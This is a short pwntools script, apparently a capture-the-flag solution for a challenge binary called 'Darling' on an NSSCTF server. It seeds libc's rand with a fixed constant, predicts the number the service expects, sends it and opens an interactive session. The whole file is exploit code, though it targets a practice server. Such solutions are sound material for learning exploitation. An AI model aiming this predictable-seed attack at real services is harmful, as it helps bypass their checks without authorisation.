from pwn import *
from ctypes import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])


io=remote("node2.anna.nssctf.cn",28835)
# io=process("./Darling")
elf=ELF("./Darling")
cs=cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

io.recvuntil(b"you.\n\n")
cs.srand(0x1317E53)
num=str(cs.rand()%100-64)
io.sendline(num)


io.interactive()